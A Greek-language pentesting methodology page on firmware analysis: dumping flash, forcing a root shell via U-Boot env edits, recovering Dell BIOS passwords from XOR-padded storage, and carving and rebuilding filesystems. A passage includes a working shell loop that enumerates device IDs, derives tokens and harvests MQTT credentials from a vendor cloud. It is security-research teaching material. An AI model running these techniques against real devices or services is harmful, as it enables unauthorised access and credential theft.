# Ανάλυση Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Εισαγωγή**

### Σχετικοί πόροι

Για απόκτηση μέσω εκτεθειμένων διεπαφών hardware, δείτε το [dumping firmware με τη βοήθεια κονσόλας UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) και το [dumping SPI flash](../hardware-hacking/spi.md#dumping-firmware-from-eeproms).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Το firmware είναι απαραίτητο λογισμικό που επιτρέπει στις συσκευές να λειτουργούν σωστά, διαχειριζόμενο και διευκολύνοντας την επικοινωνία μεταξύ των εξαρτημάτων hardware και του λογισμικού με το οποίο αλληλεπιδρούν οι χρήστες. Αποθηκεύεται σε μόνιμη μνήμη, ώστε η συσκευή να μπορεί να έχει πρόσβαση σε ζωτικής σημασίας οδηγίες από τη στιγμή που τίθεται σε λειτουργία, οδηγώντας στην εκκίνηση του λειτουργικού συστήματος. Η εξέταση και η ενδεχόμενη τροποποίηση του firmware αποτελούν κρίσιμο βήμα για τον εντοπισμό ευπαθειών ασφαλείας.<sup>[[2]](#references)[[3]](#references)</sup>

## **Συλλογή πληροφοριών**

Η **συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Αυτή η διαδικασία περιλαμβάνει τη συλλογή δεδομένων σχετικά με:

- Την αρχιτεκτονική της CPU και το λειτουργικό σύστημα που εκτελεί
- Τα χαρακτηριστικά του bootloader
- Τη διάταξη του hardware και τα datasheets
- Μετρικές της βάσης κώδικα και τις τοποθεσίες του πηγαίου κώδικα
- Εξωτερικές βιβλιοθήκες και τύπους αδειών χρήσης
- Ιστορικό ενημερώσεων και κανονιστικές πιστοποιήσεις
- Διαγράμματα αρχιτεκτονικής και ροής
- Αξιολογήσεις ασφαλείας και εντοπισμένες ευπάθειες

Για αυτόν τον σκοπό, τα εργαλεία **open-source intelligence (OSINT)** είναι ανεκτίμητα, όπως και η ανάλυση τυχόν διαθέσιμων στοιχείων λογισμικού ανοικτού κώδικα μέσω μη αυτόματων και αυτοματοποιημένων διαδικασιών ελέγχου. Εργαλεία όπως το [Coverity Scan](https://scan.coverity.com) και το [LGTM της Semmle](https://lgtm.com/#explore) προσφέρουν δωρεάν static analysis, η οποία μπορεί να αξιοποιηθεί για τον εντοπισμό πιθανών προβλημάτων.

## **Απόκτηση του Firmware**

Η απόκτηση firmware μπορεί να γίνει με διάφορους τρόπους, καθένας με διαφορετικό επίπεδο πολυπλοκότητας:

- **Απευθείας** από την πηγή (developers, κατασκευαστές)
- Με **build** από τις παρεχόμενες οδηγίες
- Με **λήψη** από επίσημους ιστότοπους υποστήριξης
- Με χρήση ερωτημάτων **Google dork** για τον εντοπισμό φιλοξενούμενων αρχείων firmware
- Με απευθείας πρόσβαση σε **cloud storage**, με εργαλεία όπως το [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Με υποκλοπή **ενημερώσεων** μέσω τεχνικών man-in-the-middle
- Με **εξαγωγή** από τη συσκευή μέσω συνδέσεων όπως **UART**, **JTAG** ή **PICit**
- Με **παρακολούθηση** αιτημάτων ενημέρωσης στην επικοινωνία της συσκευής
- Με εντοπισμό και χρήση **hardcoded endpoints ενημέρωσης**
- Με **dumping** από τον bootloader ή μέσω δικτύου
- Με **αφαίρεση και ανάγνωση** του chip αποθήκευσης, όταν αποτύχουν όλες οι άλλες μέθοδοι, χρησιμοποιώντας τα κατάλληλα εργαλεία hardware

### Μόνο UART logs: εξαναγκασμός εκκίνησης root shell μέσω του U-Boot env στο flash

Αν το UART RX αγνοείται (μόνο logs), μπορείτε και πάλι να εξαναγκάσετε την εκκίνηση ενός init shell **επεξεργαζόμενοι offline το blob του περιβάλλοντος U-Boot**:<sup>[[6]](#references)</sup>

1. Κάντε dump του SPI flash με ένα κλιπ SOIC-8 και programmer (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Εντοπίστε το partition του U-Boot env, επεξεργαστείτε το `bootargs` ώστε να συμπεριλάβει το `init=/bin/sh` και **υπολογίστε ξανά το U-Boot env CRC32** για το blob.
3. Κάντε reflash μόνο στο partition του env και επανεκκινήστε· θα πρέπει να εμφανιστεί ένα shell στο UART.

Αυτό είναι χρήσιμο σε ενσωματωμένες συσκευές όπου το shell του bootloader είναι απενεργοποιημένο, αλλά το partition του env είναι εγγράψιμο μέσω εξωτερικής πρόσβασης στο flash.

## Ανάλυση του firmware

Τώρα που **έχετε το firmware**, πρέπει να εξαγάγετε πληροφορίες σχετικά με αυτό, ώστε να γνωρίζετε πώς να το χειριστείτε. Μερικά εργαλεία που μπορείτε να χρησιμοποιήσετε γι' αυτό:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Αν δεν εντοπίσετε πολλά με αυτά τα εργαλεία, ελέγξτε την **εντροπία** της εικόνας με `binwalk -E <bin>`. Αν είναι χαμηλή, τότε μάλλον δεν είναι κρυπτογραφημένη. Αν είναι υψηλή, πιθανότατα είναι κρυπτογραφημένη (ή συμπιεσμένη με κάποιον τρόπο).

Επιπλέον, μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να εξαγάγετε **αρχεία ενσωματωμένα στο firmware**:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ή το [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) για να επιθεωρήσετε το αρχείο.

### Διαφορική ανάλυση flash και ανακτήσιμες αποθήκες μυστικών XOR

Όταν μια ρύθμιση firmware δεν έχει τεκμηριωμένη μορφή αποθήκευσης, αρχικά πραγματοποιήστε αρκετές αναγνώσεις flash με τις ίδιες παραμέτρους, αλλάξτε **ακριβώς μία** ρύθμιση, κάντε ξανά dump ολόκληρου του chip και συγκρίνετε τις μετατοπίσεις. Η επανάληψη του πειράματος με ελεγχόμενες τιμές βοηθά να διακρίνετε τη ρύθμιση από τους μετρητές και τα μεταδεδομένα εγγραφής· αλλαγές σε νέες μετατοπίσεις αντί για επιτόπου υποδηλώνουν αποθήκευση μόνο με προσθήκες ή δομή καταγραφής. Διατηρήστε τις διαγραμμένες/σημασμένες ως διαγραμμένες εγγραφές, καθώς τα bytes των payload τους μπορεί να παραμένουν ανακτήσιμα.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Αφού εντοπίσετε την περιοχή, εξαγάγετε τα firmware modules με εργαλεία όπως το `binwalk` και κάντε reverse engineering του writer/validator στο Ghidra. Επιβεβαιώστε στον κώδικα τα όρια των πεδίων, το padding, την ευρετηρίαση των κλειδιών και την παραγωγή των κλειδιών, αντί να συμπεραίνετε το σχήμα μόνο από μοτίβα ciphertext.<sup>[[12]](#references)</sup>

#### Ανάκτηση κλειδιών από κρυπτογραφημένο zero padding

Όπως περιγράφεται στην [κρυπτογράφηση XOR](../../crypto/symmetric/#xor-based-encryption), το γνωστό plaintext αποκαλύπτει byte της keystream στις ίδιες θέσεις. Ένα πεδίο σταθερού μεγέθους είναι ιδιαίτερα εκτεθειμένο όταν το zero padding του καλύπτει κάθε θέση ενός επαναλαμβανόμενου κλειδιού XOR: το κρυπτογραφημένο padding αποκαλύπτει απευθείας αυτά τα byte του κλειδιού, επειδή `0x00 XOR key_byte = key_byte`. Αν καλύπτονται όλες οι θέσεις του κλειδιού, ανασυνθέστε το κλειδί από το τέλος του ciphertext και αποκρυπτογραφήστε τα συμπληρωμένα byte.<sup>[[12]](#references)</sup>

Η ευάλωτη μορφή κωδικού πρόσβασης DVAR BIOS της Dell αποτελεί συγκεκριμένο παράδειγμα: το byte `0` ενός πεδίου 32 byte είναι plaintext, ενώ τα byte `1..31` χρησιμοποιούν ένα επαναλαμβανόμενο κλειδί 20 byte.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Για μήκος κωδικού `L`, οι θέσεις `L..31` ήταν μηδενικές πριν από το XOR. Όταν `L <= 12`, αυτές οι θέσεις καλύπτουν κάθε δείκτη κλειδιού, επομένως ανακτώνται ολόκληρο το κλειδί και ο κωδικός χωρίς brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Ανάκτηση κλειδιών από ιστορικές εγγραφές

Μην αναλύετε κάθε εγγραφή ανεξάρτητα. Το κλειδί DVAR παράγεται κατά προσέγγιση ως `modified_md5(device_seed || variable_GUID || password[0])`: το device seed και το GUID είναι σταθερά, και η μόνη είσοδος που εξαρτάται από τον κωδικό πρόσβασης είναι το μη κρυπτογραφημένο πρώτο byte. Έτσι, υπάρχουν το πολύ 256 κλειδιά ανά συσκευή, και οι εγγραφές που ξεκινούν με το ίδιο byte μοιράζονται το ίδιο κλειδί. Ομαδοποιήστε τις ενεργές και διαγραμμένες εγγραφές με βάση αυτό το byte· μια σύντομη ιστορική εγγραφή μπορεί να διαρρεύσει ολόκληρο το κλειδί μέσω του padding και να αποκρυπτογραφήσει μια τρέχουσα, μεγαλύτερη εγγραφή, για την οποία το δικό της padding δεν επαρκεί. Επομένως, η αλλαγή κωδικού πρόσβασης μπορεί να αυξήσει την έκθεση όταν το παλιό ciphertext χαρακτηρίζεται ως διαγραμμένο αντί να διαγράφεται οριστικά.<sup>[[12]](#references)</sup>

Το εργαλείο [`dellpwn`](https://github.com/R3n5k1/dellpwn) εντοπίζει το DVAR, επικυρώνει υποψήφιες εγγραφές, ανακτά κωδικούς πρόσβασης και μπορεί να εμφανίσει τα ακατέργαστα αποθηκευμένα bytes/bytes κλειδιού. Κάντε build από ένα checkout και σαρώστε μια επαληθευμένη εικόνα flash ως εξής:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Για custom parsers, απορρίψτε τα ψευδώς θετικά με βάση τη δομή των records, τους περιορισμούς στους εκτυπώσιμους χαρακτήρες, τους ελέγχους μηδενικού padding, την εντροπία του key και τη συνέπεια στα σημεία όπου το key κάνει wrap. Αν επαναλαμβανόμενα dumps δείχνουν αραιές αλλαγές bit ανά εγγραφή, καταγράψτε τις μάσκες που παρατηρήθηκαν και κατατάξτε τις διορθώσεις με βάση αυτούς τους περιορισμούς, αλλά αναφέρετε τους αμφίσημους χαρακτήρες αντί να παρουσιάζετε ευρετικά αποτελέσματα ως ακριβή ανάκτηση.<sup>[[12]](#references)</sup>

Οι password verifiers θα πρέπει να αποθηκεύουν salted, επαναληπτικό one-way hash αντί για αντιστρέψιμο ciphertext, ενώ τα log-structured stores θα πρέπει να αφαιρούν με ασφάλεια το παρωχημένο secret material.<sup>[[12]](#references)</sup>

### Λήψη του συστήματος αρχείων

Με τα εργαλεία που σχολιάστηκαν προηγουμένως, όπως το `binwalk -ev <bin>`, θα έπρεπε να έχετε καταφέρει να **εξαγάγετε το σύστημα αρχείων**.\
Το Binwalk συνήθως το εξάγει σε έναν **φάκελο με όνομα τον τύπο του συστήματος αρχείων**, που συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Χειροκίνητη εξαγωγή συστήματος αρχείων

Μερικές φορές, το binwalk **δεν θα έχει το magic byte του συστήματος αρχείων στις υπογραφές του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε το binwalk για να **βρείτε το offset του συστήματος αρχείων και να απομονώσετε το συμπιεσμένο σύστημα αρχείων** από το binary και **να εξαγάγετε χειροκίνητα** το σύστημα αρχείων ανάλογα με τον τύπο του, ακολουθώντας τα παρακάτω βήματα.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Εκτελέστε την ακόλουθη **dd command** για το carving του filesystem Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Εναλλακτικά, μπορεί να εκτελεστεί και η ακόλουθη εντολή.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (που χρησιμοποιείται στο παραπάνω παράδειγμα)

`$ unsquashfs dir.squashfs`

Τα αρχεία θα βρίσκονται στη συνέχεια στον κατάλογο "`squashfs-root`".

- Αρχεία archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για συστήματα αρχείων jffs2

`$ jefferson rootfsfile.jffs2`

- Για συστήματα αρχείων ubifs με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Ανακατασκευή διαχωρισμένων ενσωματωμένων root filesystems

Αν ένα raw dump eMMC/SSD περιέχει έγκυρη κεφαλίδα συστήματος αρχείων, αλλά τα offsets των μεταδεδομένων του εκτείνονται πέρα από το ονομαστικό partition, μην το χαρακτηρίσετε αμέσως ως κατεστραμμένο. Ο ενσωματωμένος κώδικας εκκίνησης μπορεί να συνθέσει την πραγματική συσκευή root από πολλαπλές φυσικές περιοχές με το Device Mapper, επομένως η εξαγωγή δεδομένων από ένα GPT partition παράγει μόνο το πρώτο τμήμα.<sup>[[9]](#references)</sup>

#### Αρχική διαλογή του πλήρους image του μέσου

Αρχικά, επαληθεύστε ότι η λήψη έχει ολοκληρωθεί, το μέγεθος είναι σταθερό και κανένα writer δεν διατηρεί πλέον ανοιχτό το image. Αν το όνομα αρχείου κωδικοποιεί διεύθυνση αρχής/τέλους, συγκρίνετε αυτό το εύρος με τον πραγματικό αριθμό byte. Ανακτήστε το GPT σε λειτουργία μόνο για ανάγνωση και προσαρτήστε μόνο το απαιτούμενο εύρος· **μην** εκτελέσετε `vgchange -ay` σε μη έμπιστο physical volume στον workstation, καθώς ενδέχεται να προκύψουν συγκρούσεις volume group και ακούσιες εγγραφές.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Προτίμησε μια προσωρινή VM όταν η αρχική λογική init ή μια στοίβα LVM πρέπει να έχει πρόσβαση σε ολόκληρο το image. Τα ιστορικά boot logs από ένα τυπικό boot partition είναι ιδιαίτερα χρήσιμα: ο bootloader μπορεί να έχει καταγράψει offsets proprietary container, μήκη components, επιλογή slot, κανόνες ευθυγράμμισης και επαλήθευση υπογραφής. Χρησιμοποίησε αυτές τις τιμές για να απομονώσεις ένα ενσωματωμένο command line/kernel/initramfs και, στη συνέχεια, επαλήθευσε κάθε έξοδο ανεξάρτητα με `file`, magic bytes και `binwalk`. Αν διαβάσεις μέχρι το τέλος του container, μπορεί κατά λάθος να προστεθεί στο kernel ένα initrd, ένα αντικείμενο ACPI ή μια υπογραφή.<sup>[[9]](#references)</sup>

#### Ανάκτησε τον block map κατά την εκκίνηση

Εξήγαγε το initramfs του kernel και κάνε reverse engineering στο `/init` και σε τυχόν βιβλιοθήκες αποθήκευσης. Στο [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), ακολούθησε τις αναφορές συμβολοσειρών για τα `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` και τις διαδρομές partition· έπειτα, ακολούθησε τον κώδικα που επιλέγει το ενεργό A/B slot και δημιουργεί τον πίνακα. Χρήσιμα σημεία εκκίνησης στο radare2 είναι τα `r2 -A init`, `afl`, `pdf @ main` και `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Ο στόχος linear αντιστοιχίζει διαδοχικές περιοχές μιας εικονικής συσκευής σε περιοχές μίας ή περισσότερων υποκείμενων συσκευών. Ένας ανακτημένος πίνακας δύο τμημάτων έχει συνήθως την εξής μορφή (όλες οι θέσεις και τα μήκη είναι τομείς των 512 byte):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Αναπαράγετε με ακρίβεια την αριθμητική του κώδικα μηχανής, συμπεριλαμβανομένων του πλάτους των ακεραίων, των μετατοπίσεων και των μετατροπών μονάδων. Για παράδειγμα, η ακόλουθη έκφραση στρογγυλοποιεί προς τα κάτω ένα μέγεθος σε bytes στο όριο των 4 KiB και μόνο τότε το μετατρέπει σε τομείς των 512 bytes· αν την αντικαταστήσετε με `p4_bytes // 512`, η επιλεγμένη ουρά μετατοπίζεται κατά `p4_bytes % 4096` όταν το διαμέρισμα δεν είναι ευθυγραμμισμένο σελίδας.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Ανακατασκευάστε μια επίπεδη εικόνα ανάλυσης αντιγράφοντας τα ranges με τη σειρά του πίνακα, χρησιμοποιώντας chunks περιορισμένου μεγέθους αντί να φορτώσετε ολόκληρο το media dump στη μνήμη. Έτσι αποφεύγετε επίσης τη δημιουργία mapper devices στην πλευρά του host. Κρατήστε τα offsets που προκύπτουν από το GPT, τους αντίστροφους αριθμούς τομέων και το τελικό μήκος εξόδου ως ξεχωριστούς ελέγχους.<sup>[[9]](#references)</sup>

#### Διακρίνετε την αλλοίωση από ένα σταθερό σφάλμα ανακατασκευής

Για το SquashFS, ελέγξτε το magic `hsqs` και αποκωδικοποιήστε το πεδίο `bytes_used` των 64 bit σε little-endian στη θέση 40 του superblock πριν εκτελέσετε το `unsquashfs`. Αν η εξαγωγή αποτύχει σε αρκετές άσχετες δομές, αναζητήστε σε ένα ευρύ παράθυρο γύρω από τις αναμενόμενες θέσεις και απαιτήστε ισχυρά δομικά υποψήφια: ένα block μεταδεδομένων που μπορεί να αποσυμπιεστεί, αρκετές διαδοχικές έγκυρες εγγραφές καταλόγου, εύλογα πεδία inode, ένα root inode συμβατό με τον αριθμό των inode ή έγκυρη δομή μεταδεδομένων ακεραιότητας. Μία μόνο αντιστοιχία magic δεν αρκεί.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Όταν το ίδιο signed delta καθιστά έγκυρες ανεξάρτητες δομές —για παράδειγμα, τα μεταδεδομένα καταλόγου και μια εγγραφή verity— η πιθανότερη αιτία είναι ένα συστηματικό σφάλμα στην αρχή του segment και όχι bytes που λείπουν. Επανεξετάστε τους αντίστροφους υπολογισμούς και αναζητήστε απορριφθέντα υπόλοιπα, signedness, overflow ή στρογγυλοποίηση σε sector/page πριν επιχειρήσετε ανάκτηση orphan ή επιδιόρθωση μεταδεδομένων του filesystem.<sup>[[9]](#references)</sup>

Τέλος, διατηρήστε ξεχωριστά τα όρια προστασίας: οι τόμοι LUKS με κλειδί δεσμευμένο σε TPM προστατεύουν την εμπιστευτικότητα των δεδομένων, ενώ ένα signed dm-verity mapping προστατεύει την ακεραιότητα του root filesystem. Ένα software TPM δεν ανακτά κλειδί που έχει δεσμευτεί στο αρχικό φυσικό TPM, ενώ η εκκίνηση ενός τροποποιημένου SquashFS μέσω ενός init που προορίζεται μόνο για έρευνα και παραλείπει την επαλήθευση verity δεν πλαστογραφεί την υπογραφή του ούτε παρακάμπτει το dm-verity.<sup>[[9]](#references)</sup>

## Ανάλυση Firmware

Μόλις ληφθεί το firmware, είναι απαραίτητο να αναλυθεί για να κατανοήσουμε τη δομή του και τις πιθανές ευπάθειές του. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή πολύτιμων δεδομένων από το image του firmware.

### Εργαλεία αρχικής ανάλυσης

Παρακάτω παρέχεται ένα σύνολο εντολών για την αρχική επιθεώρηση του binary αρχείου (που αναφέρεται ως `<bin>`). Αυτές οι εντολές βοηθούν στον εντοπισμό τύπων αρχείων, στην εξαγωγή strings, στην ανάλυση binary δεδομένων και στην κατανόηση των λεπτομερειών των partitions και των filesystems:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Για να αξιολογηθεί η κατάσταση κρυπτογράφησης της εικόνας, ελέγχεται η **εντροπία** με `binwalk -E <bin>`. Η χαμηλή εντροπία υποδηλώνει απουσία κρυπτογράφησης, ενώ η υψηλή εντροπία υποδηλώνει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή **ενσωματωμένων αρχείων**, συνιστώνται εργαλεία και πόροι όπως η τεκμηρίωση **file-data-carving-recovery-tools** και το **binvis.io** για την επιθεώρηση αρχείων.

### Εξαγωγή του συστήματος αρχείων

Με τη χρήση της εντολής `binwalk -ev <bin>`, συνήθως μπορεί να εξαχθεί το σύστημα αρχείων, συχνά σε έναν κατάλογο με όνομα που βασίζεται στον τύπο του συστήματος αρχείων (π.χ., squashfs, ubifs). Ωστόσο, όταν το **binwalk** αδυνατεί να αναγνωρίσει τον τύπο του συστήματος αρχείων λόγω απουσίας magic bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για τον εντοπισμό της θέσης του συστήματος αρχείων και, στη συνέχεια, της εντολής `dd` για την απομόνωσή του:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Στη συνέχεια, ανάλογα με τον τύπο του filesystem (π.χ. squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για τη μη αυτόματη εξαγωγή των περιεχομένων.

### Ανάλυση filesystem

Αφού εξαχθεί το filesystem, ξεκινά η αναζήτηση για κενά ασφαλείας. Εξετάζονται μη ασφαλείς network daemons, hardcoded διαπιστευτήρια, API endpoints, λειτουργίες διακομιστών ενημερώσεων, μη μεταγλωττισμένος κώδικας, scripts εκκίνησης και μεταγλωττισμένα binaries για offline ανάλυση.

**Βασικές τοποθεσίες** και **στοιχεία** προς έλεγχο:

- Τα **etc/shadow** και **etc/passwd** για διαπιστευτήρια χρηστών
- Πιστοποιητικά SSL και κλειδιά στο **etc/ssl**
- Αρχεία ρυθμίσεων και scripts για πιθανά κενά ασφαλείας
- Embedded binaries για περαιτέρω ανάλυση
- Συνήθεις web servers και binaries συσκευών IoT

Αρκετά εργαλεία βοηθούν στον εντοπισμό ευαίσθητων πληροφοριών και κενών ασφαλείας μέσα στο filesystem:

- Τα [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση ευαίσθητων πληροφοριών
- Το [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για ολοκληρωμένη ανάλυση firmware
- Τα [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) και [**EMBA**](https://github.com/e-m-b-a/emba) για στατική και δυναμική ανάλυση

### Έλεγχοι ασφαλείας σε μεταγλωττισμένα binaries

Τόσο ο πηγαίος κώδικας όσο και τα μεταγλωττισμένα binaries που βρίσκονται στο filesystem πρέπει να ελέγχονται σχολαστικά για κενά ασφαλείας. Εργαλεία όπως το **checksec.sh** για binaries Unix και το **PESecurity** για binaries Windows βοηθούν στον εντοπισμό μη προστατευμένων binaries που θα μπορούσαν να γίνουν αντικείμενο εκμετάλλευσης.

## Συλλογή ρυθμίσεων cloud και διαπιστευτηρίων MQTT μέσω παραγόμενων URL tokens

Πολλά IoT hubs λαμβάνουν τις ρυθμίσεις τους ανά συσκευή από ένα cloud endpoint που έχει τη μορφή:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Κατά την ανάλυση firmware, μπορεί να διαπιστώσετε ότι το `<token>` παράγεται τοπικά από το device ID, χρησιμοποιώντας ένα hardcoded secret, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) και αναπαρίσταται ως κεφαλαίο hex

Αυτός ο σχεδιασμός επιτρέπει σε οποιονδήποτε γνωρίζει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να ανακτήσει τις ρυθμίσεις cloud, αποκαλύπτοντας συχνά διαπιστευτήρια MQTT σε απλό κείμενο και prefixes θεμάτων.

Πρακτική ροή εργασίας:

1) Εξαγωγή του deviceId από τα UART boot logs

- Συνδέστε έναν προσαρμογέα UART 3.3V (TX/RX/GND) και καταγράψτε τα logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Αναζητήστε γραμμές που εμφανίζουν το μοτίβο URL της διαμόρφωσης cloud και τη διεύθυνση broker, για παράδειγμα:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Ανάκτηση του STATIC_KEY και του αλγορίθμου token από το firmware

- Φορτώστε τα binaries στο Ghidra/radare2 και αναζητήστε το config path ("/pf/") ή τη χρήση του MD5.
- Επιβεβαιώστε τον αλγόριθμο (π.χ., MD5(deviceId||STATIC_KEY)).
- Υπολογίστε το token στο Bash και μετατρέψτε το digest σε κεφαλαία:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Συλλογή cloud config και MQTT credentials

- Συνθέστε το URL και κατεβάστε το JSON με curl· αναλύστε το με jq για να εξαγάγετε secrets:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Εκμεταλλευτείτε plaintext MQTT και αδύναμα topic ACLs (αν υπάρχουν)

- Χρησιμοποιήστε τα credentials που ανακτήθηκαν για να εγγραφείτε σε maintenance topics και να αναζητήσετε ευαίσθητα συμβάντα:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Καταγράψτε προβλέψιμα device IDs (σε μεγάλη κλίμακα, με εξουσιοδότηση)

- Πολλά οικοσυστήματα ενσωματώνουν bytes OUI/προϊόντος/τύπου του κατασκευαστή, ακολουθούμενα από ένα διαδοχικό επίθημα.
- Μπορείτε να δοκιμάζετε υποψήφια IDs, να παράγετε tokens και να ανακτάτε configs μέσω προγραμματισμού:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Σημειώσεις
- Να λαμβάνετε πάντα ρητή εξουσιοδότηση πριν επιχειρήσετε μαζική απαρίθμηση.
- Όπου είναι δυνατό, προτιμήστε την emulation ή τη static analysis για την ανάκτηση μυστικών, χωρίς να τροποποιείτε το hardware του στόχου.


Η διαδικασία emulation του firmware επιτρέπει τη **dynamic analysis** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να αντιμετωπίσει προκλήσεις που σχετίζονται με εξαρτήσεις από το hardware ή την αρχιτεκτονική, αλλά η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με αντίστοιχη αρχιτεκτονική και endianness, όπως ένα Raspberry Pi, ή σε μια προρυθμισμένη virtual machine, μπορεί να διευκολύνει περαιτέρω δοκιμές.

### Emulation μεμονωμένων Binaries

